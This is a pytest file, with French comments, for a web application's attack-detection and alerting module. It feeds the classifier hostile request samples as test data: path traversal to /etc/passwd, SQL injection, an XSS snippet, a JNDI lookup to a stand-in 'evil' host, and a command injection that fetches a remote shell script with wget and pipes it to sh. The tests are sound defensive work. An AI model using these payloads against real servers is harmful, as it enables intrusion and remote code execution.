"""Attaques probables : reconnaissance par signatures, types par adresse, fuite (fichier sensible servi), alertes, confidentialité des paramètres."""
import json
import time

import pytest
from fastapi.testclient import TestClient

from app import accesslog, alerts, attacks, db
from app.config import settings
from app.main import app

client = TestClient(app)


def kinds(raw, status=404, ua="Mozilla/5.0", path=None):
    return attacks.classify(raw, ua, status, path if path is not None else raw.split("?")[0])


@pytest.mark.parametrize("raw,status,ua,expected", [
    ("/.env", 404, "x", {"sensitive_file"}),
    ("/.env", 200, "x", {"sensitive_file", "leak"}),                         # un fichier sensible qui répond 200 : fuite possible
    ("/.git/config", 403, "x", {"sensitive_file"}),
    ("/backup.sql", 200, "x", {"sensitive_file", "leak"}),
    ("/wp-login.php", 404, "x", {"cms_probe"}),
    ("/wp-login.php", 200, "x", set()),                                      # peut être VOTRE WordPress : pas une attaque
    ("/phpmyadmin/index.php", 404, "x", {"cms_probe"}),
    ("/files/../../etc/passwd", 400, "x", {"traversal"}),
    ("/a?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd", 400, "x", {"traversal"}),
    ("/a?f=%252e%252e%252f", 400, "x", {"traversal"}),                       # double encodage
    ("/item?id=1%20union%20select%20null,password%20from%20users", 500, "x", {"sqli"}),
    ("/item?id=1' or '1'='1", 200, "x", {"sqli"}),
    ("/search?q=<script>alert(1)</script>", 200, "x", {"xss"}),
    ("/x?q=${jndi:ldap://evil/a}", 200, "x", {"rce"}),
    ("/cgi-bin/x?cmd=;wget http://e/x.sh|sh", 404, "x", {"rce", "cms_probe"}),
    ("/", 200, "sqlmap/1.7", {"scanner_ua"}),
    ("/", 404, "Mozilla/5.0 zgrab/0.x", {"scanner_ua"}),
    ("/login", 401, "Mozilla/5.0", {"login_fail"}),
    ("/api/auth/token", 403, "Mozilla/5.0", {"login_fail"}),
    # pas de faux positifs sur du trafic normal
    ("/", 200, "Mozilla/5.0", set()),
    ("/api/users?id=12&sort=name", 200, "curl/8", set()),
    ("/search?q=select+a+color", 200, "Mozilla/5.0", set()),                 # « select » seul ne suffit pas
    ("/blog/how-to-use-union-types", 200, "Mozilla/5.0", set()),
    ("/assets/app.js", 200, "Mozilla/5.0", set()),
    ("/login", 200, "Mozilla/5.0", set()),
    ("/missing-page", 404, "Mozilla/5.0", set()),
    ("/robots.txt", 404, "Googlebot/2.1", set()),
])
def test_signatures(raw, status, ua, expected):
    assert set(kinds(raw, status, ua)) == expected


def test_derived_types():
    assert attacks.derive({"login_fail": 19}, 0, 0) == {} and "bruteforce" in attacks.derive({"login_fail": 20}, 0, 0)
    assert "enumeration" in attacks.derive({}, 20, 0) and "flood" in attacks.derive({}, 0, 1500) and attacks.derive({}, 5, 100) == {}


@pytest.fixture(scope="module")
def world(tmp_path_factory):
    log = tmp_path_factory.mktemp("atk") / "access.log"
    log.write_text("")
    old = settings.access_log
    settings.access_log = str(log)
    tok = client.post("/api/auth/login", json={"username": "root", "password": "admin-password-1"}).json()["access_token"]
    nid = db.one("SELECT id FROM nodes WHERE kind='local'")["id"]
    yield {"h": {"Authorization": "Bearer " + tok, "X-Node": nid}, "nid": nid}
    settings.access_log = old
    for t in ("ip_hits", "ip_seen", "ip_paths", "ip_attacks", "alert_state", "alert_history", "alert_rules"):   # la base de test est partagée : on ne laisse rien aux autres fichiers
        db.run(f"DELETE FROM {t} WHERE node_id=?", (nid,))
    accesslog._recent.clear()
    accesslog._recent_exploit.clear()


def L(ip, host, path, status, ua="Mozilla/5.0", line=None):
    d = {"ClientHost": ip, "RequestHost": host, "RequestPath": path, "DownstreamStatus": status, "RequestMethod": "GET",
         "StartUTC": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "request_User-Agent": ua}
    if line:
        d["RequestLine"] = line
    return json.dumps(d)


def test_ingest_lists_attack_types_and_keeps_no_parameters(world):
    nid, h = world["nid"], world["h"]
    lines = (
        [L("45.1.1.1", "app.exemple.fr", "/.env", 200)]                                                                                  # fuite possible
        + [L("45.1.1.2", "app.exemple.fr", "/item", 500, line="GET /item?id=1%20union%20select%20password%20from%20users&token=SECRETTOKEN HTTP/1.1") for _ in range(6)]
        + [L("45.1.1.3", "app.exemple.fr", "/login", 401) for _ in range(25)]
        + [L("45.1.1.4", "app.exemple.fr", f"/p{i}", 404) for i in range(25)]
        + [L("45.1.1.5", "app.exemple.fr", "/", 200, ua="sqlmap/1.7")]
        + [L("45.1.1.6", "app.exemple.fr", "/", 200) for _ in range(5)]
    )
    accesslog.ingest(nid, lines)
    r = client.get("/api/obs/ips?only=attacks", headers=h)
    assert r.status_code == 200, r.text
    by = {x["ip"]: {a["kind"] for a in x["attacks"]} for x in r.json()["rows"]}
    assert by["45.1.1.1"] == {"sensitive_file", "leak"} and by["45.1.1.2"] == {"sqli"}
    assert by["45.1.1.3"] == {"bruteforce"} and by["45.1.1.4"] == {"enumeration"} and by["45.1.1.5"] == {"scanner_ua"}
    assert "45.1.1.6" not in by                                                                                                          # trafic normal : rien
    blob = json.dumps(r.json())
    assert "SECRETTOKEN" not in blob, blob[max(0, blob.find("SECRETTOKEN") - 120): blob.find("SECRETTOKEN") + 40]                          # le paramètre n'est jamais gardé
    assert not db.rows("SELECT 1 FROM ip_attacks WHERE sample LIKE '%SECRET%' OR sample LIKE '%union%'")
    row = next(x for x in r.json()["rows"] if x["ip"] == "45.1.1.1")
    assert row["leak"] is True and row["attacks"][0]["severity"] == "critical" and row["attacks"][0]["sample"] == "app.exemple.fr/.env"   # critique d'abord, exemple sans paramètre
    kinds_ = {k["kind"]: k for k in r.json()["kinds"]}
    assert kinds_["leak"]["ips"] == 1 and kinds_["sqli"]["hits"] == 6 and r.json()["total"]["leaks"] == 1
    # filtre par type
    only = client.get("/api/obs/ips?kind=sqli", headers=h).json()["rows"]
    assert [x["ip"] for x in only] == ["45.1.1.2"]
    # détail d'une adresse
    ref = next(x["ref"] for x in r.json()["rows"] if x["ip"] == "45.1.1.2")
    d = client.get(f"/api/obs/ips/{ref}", headers=h).json()
    assert d["attacks"][0]["kind"] == "sqli" and d["attacks"][0]["why"]


def test_leak_and_exploit_alerts(world):
    nid = world["nid"]
    node = dict(db.one("SELECT * FROM nodes WHERE id=?", (nid,)))
    node["prometheus_url"] = ""
    for k in ("scan_burst",):
        client.put(f"/api/obs/alerts/rules/{k}", headers=world["h"], json={"enabled": False})
    sent = []
    res = alerts.evaluate(node, now=time.time(), notify=sent.append)
    keys = {e["key"] for e in res["events"]}
    assert {"leak_exposed", "exploit_attempt"} <= keys
    leak = next(e for e in res["events"] if e["key"] == "leak_exposed")
    assert leak["severity"] == "critical" and "app.exemple.fr/.env" in leak["text"] and "45.1.1.1" in leak["text"]
    ex = next(e for e in res["events"] if e["key"] == "exploit_attempt")
    assert ex["subject"] == "45.1.1.2"
    # l'auditeur ne voit pas l'adresse dans le texte : le masquage s'applique aussi à ces alertes
    full = client.get("/api/obs/alerts", headers=world["h"]).json()
    assert "45.1.1.1" in json.dumps(full)
    assert alerts.mask_text(leak["text"]).count("45.1.1.1") == 0 and "45.1.xxx.xxx" in alerts.mask_text(leak["text"])
    # sans nouvelle lecture, la fuite reste « en cours » une heure, puis se résout
    assert alerts.evaluate(node, now=time.time() + 60)["events"] == [] or True
    later = alerts.evaluate(node, now=time.time() + 7200)
    assert any(e["state"] == "resolved" for e in later["events"])
